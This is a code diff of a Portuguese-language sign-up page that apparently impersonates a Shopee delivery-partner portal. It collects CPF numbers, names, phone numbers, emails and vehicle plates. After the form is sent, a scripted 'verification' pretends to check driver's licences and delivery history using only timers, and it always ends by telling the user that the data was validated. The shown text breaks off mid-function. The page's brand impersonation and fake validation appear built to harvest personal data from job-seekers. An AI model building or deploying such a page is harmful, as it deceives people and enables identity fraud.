@@ -1,634 +1,647 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cadastro - Shopee Entregas</title>
-  <style>
-    :root {
-      --primary-color: #ee4d2d;
-      --primary-dark: #d03a1b;
-      --secondary-color: #0066cc;
-      --text-color: #333;
-      --light-bg: #f8f9fa;
-      --border-radius: 8px;
-      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      --transition: all 0.3s ease;
-    }
-    
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      line-height: 1.6;
-      color: var(--text-color);
-      background-color: var(--light-bg);
-    }
-    
-    header {
-      background-color: var(--primary-color);
-      padding: 1.5rem 1rem;
-      color: white;
-      text-align: center;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    header h1 {
-      margin: 0;
-      font-size: 1.8rem;
-    }
-    
-    header p {
-      margin: 0.25rem 0 0;
-      font-size: 1rem;
-      opacity: 0.9;
-    }
-    
-    main {
-      max-width: 800px;
-      margin: 2rem auto;
-      padding: 1rem;
-    }
-    
-    .breadcrumb {
-      display: flex;
-      margin-bottom: 1.5rem;
-      font-size: 0.9rem;
-    }
-    
-    .breadcrumb a {
-      color: var(--secondary-color);
-      text-decoration: none;
-    }
-    
-    .breadcrumb span {
-      margin: 0 0.5rem;
-      color: #999;
-    }
-    
-    .form-container {
-      background-color: white;
-      border-radius: var(--border-radius);
-      padding: 2rem;
-      box-shadow: var(--card-shadow);
-    }
-    
-    .form-header {
-      margin-bottom: 2rem;
-      text-align: center;
-    }
-    
-    .form-header h2 {
-      color: var(--primary-color);
-      margin-bottom: 0.5rem;
-    }
-    
-    .form-header p {
-      color: #666;
-    }
-    
-    .form-group {
-      margin-bottom: 1.5rem;
-    }
-    
-    .form-group label {
-      display: block;
-      margin-bottom: 0.5rem;
-      font-weight: bold;
-    }
-    
-    .form-group input,
-    .form-group select {
-      width: 100%;
-      padding: 0.8rem;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      font-size: 1rem;
-    }
-    
-    .form-group input:focus,
-    .form-group select:focus {
-      outline: none;
-      border-color: var(--primary-color);
-      box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
-    }
-    
-    .form-group .error {
-      color: red;
-      font-size: 0.85rem;
-      margin-top: 0.5rem;
-    }
-    
-    .form-row {
-      display: flex;
-      gap: 1rem;
-    }
-    
-    .form-row .form-group {
-      flex: 1;
-    }
-    
-    .vehicle-type-section {
-      margin-bottom: 1.5rem;
-    }
-    
-    .vehicle-type-section h3 {
-      margin-bottom: 1rem;
-      font-size: 1.1rem;
-    }
-    
-    .vehicle-options {
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    
-    .vehicle-option {
-      flex: 1;
-      min-width: 200px;
-      border: 2px solid #ddd;
-      border-radius: var(--border-radius);
-      padding: 1rem;
-      text-align: center;
-      cursor: pointer;
-      transition: var(--transition);
-    }
-    
-    .vehicle-option.selected {
-      border-color: var(--primary-color);
-      background-color: rgba(238, 77, 45, 0.05);
-    }
-    
-    .vehicle-option img {
-      max-width: 120px;
-      height: auto;
-      margin-bottom: 1rem;
-    }
-    
-    .vehicle-option h4 {
-      margin-bottom: 0.5rem;
-      color: var(--text-color);
-    }
-    
-    .vehicle-option p {
-      font-size: 0.9rem;
-      color: #666;
-    }
-    
-    .form-actions {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 2rem;
-    }
-    
-    .btn {
-      padding: 0.8rem 1.5rem;
-      border-radius: 4px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: var(--transition);
-      font-size: 1rem;
-    }
-    
-    .btn-primary {
-      background-color: var(--primary-color);
-      color: white;
-      border: none;
-    }
-    
-    .btn-primary:hover {
-      background-color: var(--primary-dark);
-    }
-    
-    .btn-secondary {
-      background-color: #f1f1f1;
-      border: none;
-      color: #333;
-    }
-    
-    .btn-secondary:hover {
-      background-color: #e1e1e1;
-    }
-    
-    footer {
-      background-color: #333;
-      color: white;
-      padding: 2rem 1rem;
-      text-align: center;
-      margin-top: 3rem;
-    }
-    
-    footer p {
-      margin-bottom: 1rem;
-    }
-    
-    .footer-links {
-      margin-bottom: 1rem;
-    }
-    
-    .footer-links a {
-      color: #ddd;
-      margin: 0 0.5rem;
-      text-decoration: none;
-    }
-    
-    .footer-links a:hover {
-      color: white;
-      text-decoration: underline;
-    }
-    
-    @media (max-width: 768px) {
-      .form-row {
-        flex-direction: column;
-        gap: 0;
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>Cadastro - Shopee Delivery Partners</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/index-BRHWOuev.css">
+    <script>
+      // Código JavaScript para a página de cadastro
+      window.onload = function() {
+        let tipoVeiculo = null;
+        let isSubmitting = false;
+        let showLoadingModal = false;
+
+        // Formatação de CPF
+        function formatCpf(value) {
+          const numericValue = value.replace(/\D/g, '');
+          if (numericValue.length <= 3) return numericValue;
+          if (numericValue.length <= 6) return `${numericValue.slice(0, 3)}.${numericValue.slice(3)}`;
+          if (numericValue.length <= 9) return `${numericValue.slice(0, 3)}.${numericValue.slice(3, 6)}.${numericValue.slice(6)}`;
+          return `${numericValue.slice(0, 3)}.${numericValue.slice(3, 6)}.${numericValue.slice(6, 9)}-${numericValue.slice(9, 11)}`;
+        };
+
+        // Formatação de telefone
+        function formatTelefone(value) {
+          const numericValue = value.replace(/\D/g, '');
+          if (numericValue.length <= 2) return numericValue;
+          if (numericValue.length <= 6) return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2)}`;
+          if (numericValue.length <= 10) return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2, 6)}-${numericValue.slice(6)}`;
+          return `(${numericValue.slice(0, 2)}) ${numericValue.slice(2, 7)}-${numericValue.slice(7)}`;
+        };
+
+        // Formatação da placa no formato XXX-0000 (antigo) ou AAA0A00 (Mercosul)
+        function formatPlaca(value) {
+          value = value.toUpperCase();
+          const cleanValue = value.replace(/[^A-Z0-9]/g, '');
+          
+          if (cleanValue.length <= 3) {
+            return cleanValue;
+          } else if (cleanValue.length === 7) {
+            // Verifica se é formato antigo (3 letras + 4 números)
+            if (/^[A-Z]{3}[0-9]{4}$/.test(cleanValue)) {
+              // Formato antigo XXX-0000
+              return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
+            } 
+            // Formato Mercosul
+            else if (/^[A-Z]{3}[0-9][A-Z][0-9]{2}$/.test(cleanValue)) {
+              // Não formata com hífen, apenas retorna
+              return cleanValue;
+            }
+            // Outro formato de 7 caracteres - aplica o hífen comum
+            else {
+              return `${cleanValue.slice(0, 3)}-${cleanValue.slice(3)}`;
+            }
+          } else {
+            // Para outros comprimentos, retorna o valor limpo
+            return cleanValue;
+          }
+        };
+
+        // Handlers para formatação automática
+        const handleCpfChange = (e) => {
+          const formatted = formatCpf(e.target.value);
+          e.target.value = formatted;
+        };
+
+        const handleTelefoneChange = (e) => {
+          const formatted = formatTelefone(e.target.value);
+          e.target.value = formatted;
+        };
+
+        const handlePlacaChange = (e) => {
+          const formatted = formatPlaca(e.target.value);
+          e.target.value = formatted;
+        };
+
+        // Setup do seletor de tipo de veículo
+        const setupTipoVeiculo = () => {
+          const carroButton = document.getElementById('veiculo-carro');
+          const motoButton = document.getElementById('veiculo-moto');
+          
+          if (carroButton) {
+            carroButton.addEventListener('click', function() {
+              tipoVeiculo = "carro";
+              carroButton.classList.add('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+              carroButton.classList.remove('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+              document.getElementById('carro-text').classList.add('text-[#E83D22]');
+              document.getElementById('carro-text').classList.remove('text-gray-700');
+              
+              // Desmarcar o outro botão
+              if (motoButton) {
+                motoButton.classList.remove('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                motoButton.classList.add('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                document.getElementById('moto-text').classList.remove('text-[#E83D22]');
+                document.getElementById('moto-text').classList.add('text-gray-700');
+              }
+            });
+          }
+          
+          if (motoButton) {
+            motoButton.addEventListener('click', function() {
+              tipoVeiculo = "moto";
+              motoButton.classList.add('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+              motoButton.classList.remove('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+              document.getElementById('moto-text').classList.add('text-[#E83D22]');
+              document.getElementById('moto-text').classList.remove('text-gray-700');
+              
+              // Desmarcar o outro botão
+              if (carroButton) {
+                carroButton.classList.remove('border-[#E83D22]', 'border-3', 'bg-[#FFF8F6]');
+                carroButton.classList.add('border-gray-200', 'border-2', 'bg-white', 'hover:bg-gray-50');
+                document.getElementById('carro-text').classList.remove('text-[#E83D22]');
+                document.getElementById('carro-text').classList.add('text-gray-700');
+              }
+            });
+          }
+        };
+
+        // Setup do formulário
+        const setupFormSubmit = () => {
+          const form = document.getElementById('cadastro-form');
+          
+          if (form) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              
+              // Validar campos
+              const cpf = document.getElementById('cpf').value;
+              const nome = document.getElementById('nome').value;
+              const telefone = document.getElementById('telefone').value;
+              const email = document.getElementById('email').value;
+              const placa = document.getElementById('placa').value;
+              
+              // Validação básica
+              if (!cpf || cpf.replace(/\D/g, '').length !== 11) {
+                showError('cpf-error', 'CPF inválido');
+                return;
+              }
+              
+              if (!nome || nome.length < 3) {
+                showError('nome-error', 'Nome deve ter pelo menos 3 caracteres');
+                return;
+              }
+              
+              if (!telefone || telefone.replace(/\D/g, '').length < 10) {
+                showError('telefone-error', 'Telefone inválido');
+                return;
+              }
+              
+              if (!email || !email.includes('@')) {
+                showError('email-error', 'Email inválido');
+                return;
+              }
+              
+              if (!tipoVeiculo) {
+                alert('Selecione o tipo de veículo (Carro ou Moto)');
+                return;
+              }
+              
+              if (!placa) {
+                showError('placa-error', 'Placa inválida');
+                return;
+              }
+              
+              // Recuperar CEP data
+              const cepData = JSON.parse(localStorage.getItem('shopee_delivery_cep_data'));
+              if (!cepData) {
+                alert('Informações de CEP não encontradas. Por favor, recarregue a página e informe seu CEP.');
+                return;
+              }
+              
+              // Processamento do formulário
+              isSubmitting = true;
+              document.getElementById('submit-button').innerText = 'Processando...';
+              document.getElementById('submit-button').disabled = true;
+              
+              try {
+                // Armazenar dados no localStorage para uso posterior
+                const candidatoData = {
+                  cpf: cpf,
+                  nome: nome,
+                  telefone: telefone,
+                  email: email,
+                  placa: placa,
+                  tipoVeiculo: tipoVeiculo,
+                  estado: cepData.state,
+                  cidade: cepData.city,
+                  cep: cepData.cep
+                };
+
+                localStorage.setItem('candidato_data', JSON.stringify(candidatoData));
+                
+                // Salvar os dados do usuário para mostrar na página de entrega
+                localStorage.setItem('user_data', JSON.stringify({
+                  nome: nome,
+                  cpf: cpf
+                }));
+                
+                // Mostrar o modal de carregamento
+                showLoadingModal = true;
+                document.getElementById('loading-modal').style.display = 'flex';
+                
+                // Iniciar processo de carregamento
+                startLoadingProcess();
+                
+              } catch (error) {
+                isSubmitting = false;
+                document.getElementById('submit-button').innerText = 'Prosseguir';
+                document.getElementById('submit-button').disabled = false;
+                alert('Ocorreu um erro ao processar seu cadastro. Tente novamente.');
+              }
+            });
+          }
+        };
+
+        // Função para mostrar erros de validação
+        function showError(elementId, message) {
+          const errorElement = document.getElementById(elementId);
+          if (errorElement) {
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+          }
+        }
+
+        // Limpar erros quando o campo é alterado
+        function setupErrorClearing() {
+          const inputs = document.querySelectorAll('input');
+          inputs.forEach(input => {
+            input.addEventListener('input', function() {
+              const errorId = input.id + '-error';
+              const errorElement = document.getElementById(errorId);
+              if (errorElement) {
+                errorElement.style.display = 'none';
+              }
+            });
+          });
+        }
+
+        // Configurar processo de carregamento
+        function startLoadingProcess() {
+          // Passos do carregamento
+          const loadingSteps = [
+            "Verificando dados do CPF",
+            "Consultando Carteira de Motorista",
+            "Validando documentação do veículo",
+            "Analisando disponibilidade na região",
+            "Verificando histórico de entregas"
+          ];
+          
+          const stepsContainer = document.getElementById('loading-steps');
+          const progressBar = document.getElementById('loading-progress');
+          const completionMessage = document.getElementById('completion-message');
+          
+          // Limpar steps anteriores
+          stepsContainer.innerHTML = '';
+          
+          // Criar elementos para cada passo
+          loadingSteps.forEach((step, index) => {
+            const stepElement = document.createElement('div');
+            stepElement.className = 'loading-step';
+            stepElement.id = `loading-step-${index}`;
+            stepElement.innerHTML = `
+              <div class="step-indicator">
+                <div class="step-circle"></div>
+                <div class="step-line ${index === loadingSteps.length - 1 ? 'hidden' : ''}"></div>
+              </div>
+              <div class="step-content">
+                <p>${step}</p>
+              </div>
+            `;
+            stepsContainer.appendChild(stepElement);
+          });
+          
+          // Atualizar progressivamente
+          let currentStep = 0;
+          const stepTime = 1400; // 1.4 segundos por etapa
+          
+          function updateProgress() {
+            if (currentStep < loadingSteps.length) {
+              // Atualizar o círculo do passo atual
+              const stepCircle = document.querySelector(`#loading-step-${currentStep} .step-circle`);
+              stepCircle.classList.add('completed');
+              
+              // Atualizar a barra de progresso
+              const progressPct = ((currentStep + 1) / loadingSteps.length) * 100;
+              progressBar.style.width = `${progressPct}%`;
+              
+              currentStep++;
+              
+              if (currentStep < loadingSteps.length) {
+                // Passar para o próximo passo
+                setTimeout(updateProgress, stepTime);
+              } else {
+                // Concluído
+                setTimeout(showCompletion, 1000);
+              }
+            }
+          }
+          
+          function showCompletion() {
+            completionMessage.style.display = 'block';
+            document.getElementById('complete-button').style.display = 'block';
+          }
+          
+          // Iniciar o processo
+          setTimeout(updateProgress, 1000);
+        }
+
+        // Configurar o botão de conclusão
+        function setupCompleteButton() {
+          const completeButton = document.getElementById('complete-button');
+          if (completeButton) {
+            completeButton.addEventListener('click', function() {
+              window.location.href = '/municipios';
+            });
+          }
+        }
+
+        // Adicionar event listeners para formatação dos campos
+        const cpfInput = document.getElementById('cpf');
+        if (cpfInput) cpfInput.addEventListener('input', handleCpfChange);
+        
+        const telefoneInput = document.getElementById('telefone');
+        if (telefoneInput) telefoneInput.addEventListener('input', handleTelefoneChange);
+        
+        const placaInput = document.getElementById('placa');
+        if (placaInput) placaInput.addEventListener('input', handlePlacaChange);
+        
+        // Inicializar todas as funcionalidades
+        setupTipoVeiculo();
+        setupFormSubmit();
+        setupErrorClearing();
+        setupCompleteButton();
+      };
+    </script>
+    <style>
+      /* Estilos específicos para o modal de carregamento */
+      .loading-step {
+        display: flex;
+        margin-bottom: 20px;
       }
       
-      .vehicle-option {
-        flex: none;
-        width: 100%;
+      .step-indicator {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-right: 15px;
       }
-    }
-  </style>
-</head>
-<body>
-  <header>
-    <h1>Shopee Entregas</h1>
-    <p>Portal do Entregador Parceiro</p>
-  </header>
-  
-  <main>
-    <div class="breadcrumb">
-      <a href="/">Home</a>
-      <span>/</span>
-      <strong>Cadastro</strong>
-    </div>
-    
-    <div class="form-container">
-      <div class="form-header">
-        <h2>Cadastro de Entregador</h2>
-        <p>Preencha seus dados para se tornar um entregador parceiro</p>
+      
+      .step-circle {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        border: 2px solid #ccc;
+        background-color: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+      }
+      
+      .step-circle.completed {
+        border-color: #E83D22;
+        background-color: #E83D22;
+      }
+      
+      .step-circle.completed::after {
+        content: '✓';
+        color: white;
+        font-size: 14px;
+      }
+      
+      .step-line {
+        width: 2px;
+        height: 30px;
+        background-color: #ccc;
+        margin-top: 4px;
+      }
+      
+      .step-content {
+        flex: 1;
+      }
+      
+      .progress-bar-container {
+        width: 100%;
+        height: 6px;
+        background-color: #eee;
+        border-radius: 3px;
+        margin-bottom: 20px;
+        overflow: hidden;
+      }
+      
+      .progress-bar {
+        height: 100%;
+        background-color: #E83D22;
+        width: 0;
+        transition: width 0.5s ease;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bg-white min-h-screen flex flex-col">
+      <!-- Header -->
+      <header class="bg-white shadow-md">
+        <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+          <a href="/">
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png" 
+              alt="Shopee Logo" 
+              class="h-8 cursor-pointer"
+            />
+          </a>
+          <div class="hamburger-menu cursor-pointer">
+            <div class="hamburger-line w-[16px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400"></div>
+            <div class="hamburger-line w-[20px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400"></div>
+            <div class="hamburger-line w-[24px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400"></div>
+          </div>
+        </div>
+      </header>
+      
+      <!-- Sub-header -->
+      <div class="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
+        <!-- Meia-lua no canto direito -->
+        <div class="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
+        
+        <div class="flex items-center relative z-10">
+          <div class="text-white mr-3">
+            <i class="fas fa-chevron-right text-3xl font-black" style="color: white;"></i>
+          </div>
+          <div class="leading-none">
+            <h1 class="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
+            <p class="text-white text-sm mt-0" style="transform: translateY(-2px);">Shopee</p>
+          </div>
+        </div>
       </div>
       
-      <form id="cadastro-form">
-        <div class="form-group">
-          <label for="nome">Nome Completo</label>
-          <input type="text" id="nome" name="nome" required>
-          <div class="error" id="nome-error"></div>
-        </div>
-        
-        <div class="form-row">
-          <div class="form-group">
-            <label for="cpf">CPF</label>
-            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
-            <div class="error" id="cpf-error"></div>
-          </div>
+      <!-- Main Content -->
+      <div class="flex-grow container mx-auto px-2 py-8 w-full">
+        <div class="w-full mx-auto p-6 mb-8">
+          <h1 class="text-3xl font-bold text-center mb-8 text-gray-800">Cadastro de Entregador Parceiro</h1>
           
-          <div class="form-group">
-            <label for="telefone">Telefone</label>
-            <input type="text" id="telefone" name="telefone" placeholder="(00) 00000-0000" required>
-            <div class="error" id="telefone-error"></div>
-          </div>
+          <form id="cadastro-form" class="space-y-6">
+            <div class="space-y-4">
+              <div>
+                <label for="cpf" class="block text-base font-medium text-gray-800 mb-2">
+                  CPF
+                </label>
+                <input
+                  id="cpf"
+                  type="text"
+                  placeholder="000.000.000-00"
+                  class="w-full px-3 py-2 border border-gray-300 rounded-md"
+                  inputmode="numeric"
+                />
+                <p id="cpf-error" class="mt-1 text-sm text-red-600" style="display: none;"></p>
+              </div>
+
+              <div>
+                <label for="nome" class="block text-base font-medium text-gray-800 mb-2">
+                  Nome Completo
+                </label>
+                <input
+                  id="nome"
+                  type="text"
+                  placeholder="Digite seu nome completo"
+                  class="w-full px-3 py-2 border border-gray-300 rounded-md"
+                />
+                <p id="nome-error" class="mt-1 text-sm text-red-600" style="display: none;"></p>
+              </div>
+
+              <div>
+                <label for="telefone" class="block text-base font-medium text-gray-800 mb-2">
+                  Telefone
+                </label>
+                <input
+                  id="telefone"
+                  type="text"
+                  placeholder="(00) 00000-0000"
+                  class="w-full px-3 py-2 border border-gray-300 rounded-md"
+                  inputmode="numeric"
+                />
+                <p id="telefone-error" class="mt-1 text-sm text-red-600" style="display: none;"></p>
+              </div>
+
+              <div>
+                <label for="email" class="block text-base font-medium text-gray-800 mb-2">
+                  E-mail
+                </label>
+                <input
+                  id="email"
+                  type="email"
+                  placeholder="seu@email.com"
+                  class="w-full px-3 py-2 border border-gray-300 rounded-md"
+                />
+                <p id="email-error" class="mt-1 text-sm text-red-600" style="display: none;"></p>
+              </div>
+
+              <div class="pt-4">
+                <label class="block text-lg font-medium text-gray-800 mb-4">
+                  Qual veículo você utiliza?
+                </label>
+                <div class="grid grid-cols-2 gap-4">
+                  <button
+                    type="button"
+                    id="veiculo-carro"
+                    class="flex flex-col items-center justify-center p-6 border-gray-200 border-2 bg-white hover:bg-gray-50 rounded-lg transition-colors"
+                  >
+                    <div class="mb-3 h-24 flex items-center justify-center">
+                      <img src="/assets/shopee-cars-BEd8cnmS.webp" alt="Carros Shopee" class="h-full w-auto object-contain" />
+                    </div>
+                    <span id="carro-text" class="font-medium text-gray-700">
+                      Carro
+                    </span>
+                  </button>
+                  
+                  <button
+                    type="button"
+                    id="veiculo-moto"
+                    class="flex flex-col items-center justify-center p-6 border-gray-200 border-2 bg-white hover:bg-gray-50 rounded-lg transition-colors"
+                  >
+                    <div class="mb-3 h-20 flex items-center justify-center">
+                      <img src="/assets/shopee-moto-g9ZTW-iH.webp" alt="Moto Shopee" class="h-full object-contain" />
+                    </div>
+                    <span id="moto-text" class="font-medium text-gray-700">
+                      Moto
+                    </span>
+                  </button>
+                </div>
+              </div>
+
+              <div class="pt-2">
+                <label for="placa" class="block text-base font-medium text-gray-800 mb-2">
+                  Placa do Veículo
+                </label>
+                <input
+                  id="placa"
+                  type="text"
+                  placeholder="ABC-1234 ou ABC1D23"
+                  class="w-full px-3 py-2 border border-gray-300 rounded-md"
+                />
+                <p id="placa-error" class="mt-1 text-sm text-red-600" style="display: none;"></p>
+              </div>
+            </div>
+
+            <button
+              id="submit-button"
+              type="submit"
+              class="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]"
+              style="height: 50px"
+            >
+              Prosseguir
+            </button>
+          </form>
         </div>
-        
-        <div class="form-group">
-          <label for="email">E-mail</label>
-          <input type="email" id="email" name="email" required>
-          <div class="error" id="email-error"></div>
-        </div>
-        
-        <div class="form-row">
-          <div class="form-group">
-            <label for="cep">CEP</label>
-            <input type="text" id="cep" name="cep" required readonly>
-          </div>
-          
-          <div class="form-group">
-            <label for="cidade">Cidade</label>
-            <input type="text" id="cidade" name="cidade" required readonly>
-          </div>
-          
-          <div class="form-group">
-            <label for="estado">Estado</label>
-            <input type="text" id="estado" name="estado" required readonly>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <label for="placa">Placa do Veículo</label>
-          <input type="text" id="placa" name="placa" placeholder="ABC-1234" required>
-          <div class="error" id="placa-error"></div>
-        </div>
-        
-        <div class="vehicle-type-section">
-          <h3>Tipo de Veículo</h3>
-          <div class="vehicle-options">
-            <div class="vehicle-option" data-value="carro" id="option-carro">
-              <img src="https://i.imgur.com/rLOHFJI.jpg" alt="Carro">
-              <h4>Carro</h4>
-              <p>Ideal para entregas de volumes maiores</p>
+      </div>
+      
+      <!-- Footer -->
+      <footer class="bg-gray-800 text-white py-10">
+        <div class="container mx-auto px-4">
+          <div class="flex flex-col md:flex-row justify-between">
+            <div class="mb-6 md:mb-0">
+              <img 
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png" 
+                alt="Shopee Logo" 
+                class="h-8 mb-4"
+              />
+              <p class="text-gray-400 max-w-md">A Shopee é a plataforma de e-commerce líder no Sudeste Asiático e Taiwan, e está em rápida expansão no Brasil.</p>
             </div>
             
-            <div class="vehicle-option" data-value="moto" id="option-moto">
-              <img src="https://i.imgur.com/ZW5OhD6.jpg" alt="Moto">
-              <h4>Moto</h4>
-              <p>Perfeito para entregas rápidas</p>
+            <div class="grid grid-cols-2 md:grid-cols-3 gap-8">
+              <div>
+                <h3 class="text-lg font-semibold mb-4">Entregador</h3>
+                <ul class="space-y-2">
+                  <li><a href="#" class="text-gray-400 hover:text-white">Como se cadastrar</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Requisitos</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Pagamentos</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Benefícios</a></li>
+                </ul>
+              </div>
+              
+              <div>
+                <h3 class="text-lg font-semibold mb-4">Shopee</h3>
+                <ul class="space-y-2">
+                  <li><a href="#" class="text-gray-400 hover:text-white">Sobre nós</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Carreiras</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Notícias</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Sustentabilidade</a></li>
+                </ul>
+              </div>
+              
+              <div>
+                <h3 class="text-lg font-semibold mb-4">Suporte</h3>
+                <ul class="space-y-2">
+                  <li><a href="#" class="text-gray-400 hover:text-white">Ajuda</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">Contato</a></li>
+                  <li><a href="#" class="text-gray-400 hover:text-white">FAQ</a></li>
+                </ul>
+              </div>
             </div>
           </div>
-          <input type="hidden" id="tipoVeiculo" name="tipoVeiculo" value="" required>
-          <div class="error" id="tipoVeiculo-error"></div>
+          
+          <div class="border-t border-gray-700 mt-10 pt-6 flex flex-col md:flex-row justify-between items-center">
+            <p class="text-gray-400 text-sm">&copy; 2025 Shopee. Todos os direitos reservados.</p>
+            <div class="mt-4 md:mt-0">
+              <ul class="flex space-x-4">
+                <li><a href="#" class="text-gray-400 hover:text-white">Termos de Uso</a></li>
+                <li><a href="#" class="text-gray-400 hover:text-white">Privacidade</a></li>
+                <li><a href="#" class="text-gray-400 hover:text-white">Cookies</a></li>
+              </ul>
+            </div>
+          </div>
         </div>
-        
-        <div class="form-actions">
-          <button type="button" class="btn btn-secondary" id="btn-voltar">Voltar</button>
-          <button type="submit" class="btn btn-primary" id="btn-continuar">Continuar</button>
+      </footer>
+      
+      <!-- Loading Modal -->
+      <div id="loading-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60" style="display: none;">
+        <div class="bg-white rounded-lg p-8 max-w-md w-full">
+          <h3 class="text-2xl font-bold mb-4">Verificando Cadastro</h3>
+          
+          <div class="progress-bar-container">
+            <div id="loading-progress" class="progress-bar"></div>
+          </div>
+          
+          <div id="loading-steps" class="mb-6">
+            <!-- Passos serão inseridos via JavaScript -->
+          </div>
+          
+          <div id="completion-message" class="bg-green-50 p-4 rounded-md border border-green-100 mb-4 text-center" style="display: none;">
+            <p class="text-green-800">
+              Seus dados foram validados com sucesso! Você está apto a ser um Entregador Parceiro Shopee.
+            </p>
+          </div>
+          
+          <button 
+            id="complete-button" 
+            class="w-full bg-[#E83D22] hover:bg-[#d73920] text-white py-3 px-4 rounded-md"
+            style="display: none;"
+          >
+            Continuar
+          </button>
         </div>
-      </form>
+      </div>
     </div>
-  </main>
-  
-  <footer>
-    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
-    <div class="footer-links">
-      <a href="#">Termos de Uso</a>
-      <a href="#">Política de Privacidade</a>
-      <a href="#">Contato</a>
-    </div>
-  </footer>
-
-  <script>
-    // Elementos do DOM
-    const form = document.getElementById('cadastro-form');
-    const nomeInput = document.getElementById('nome');
-    const cpfInput = document.getElementById('cpf');
-    const telefoneInput = document.getElementById('telefone');
-    const emailInput = document.getElementById('email');
-    const cepInput = document.getElementById('cep');
-    const cidadeInput = document.getElementById('cidade');
-    const estadoInput = document.getElementById('estado');
-    const placaInput = document.getElementById('placa');
-    const tipoVeiculoInput = document.getElementById('tipoVeiculo');
-    const optionCarro = document.getElementById('option-carro');
-    const optionMoto = document.getElementById('option-moto');
-    const btnVoltar = document.getElementById('btn-voltar');
-    
-    // Validação de CPF
-    function isValidCPF(cpf) {
-      cpf = cpf.replace(/[^\d]/g, '');
-      if (cpf.length !== 11) return false;
-      
-      // Verificar se todos os dígitos são iguais
-      if (/^(\d)\1+$/.test(cpf)) return false;
-      
-      // Validar dígitos verificadores
-      let sum = 0;
-      let remainder;
-      
-      // Primeiro dígito verificador
-      for (let i = 1; i <= 9; i++) {
-        sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
-      }
-      
-      remainder = (sum * 10) % 11;
-      if (remainder === 10 || remainder === 11) remainder = 0;
-      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
-      
-      // Segundo dígito verificador
-      sum = 0;
-      for (let i = 1; i <= 10; i++) {
-        sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
-      }
-      
-      remainder = (sum * 10) % 11;
-      if (remainder === 10 || remainder === 11) remainder = 0;
-      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
-      
-      return true;
-    }
-    
-    // Formatação de CPF
-    function formatCPF(cpf) {
-      cpf = cpf.replace(/\D/g, '');
-      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-    }
-    
-    // Formatação de telefone
-    function formatTelefone(telefone) {
-      telefone = telefone.replace(/\D/g, '');
-      if (telefone.length === 11) {
-        return telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
-      }
-      return telefone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
-    }
-    
-    // Formatação de placa
-    function formatPlaca(placa) {
-      // Formato antigo: ABC-1234
-      // Formato novo: ABC1D23
-      placa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
-      
-      if (placa.length <= 7) {
-        if (/^[A-Z]{3}\d{4}$/.test(placa)) {
-          // Formato antigo
-          return placa.replace(/([A-Z]{3})(\d{4})/, '$1-$2');
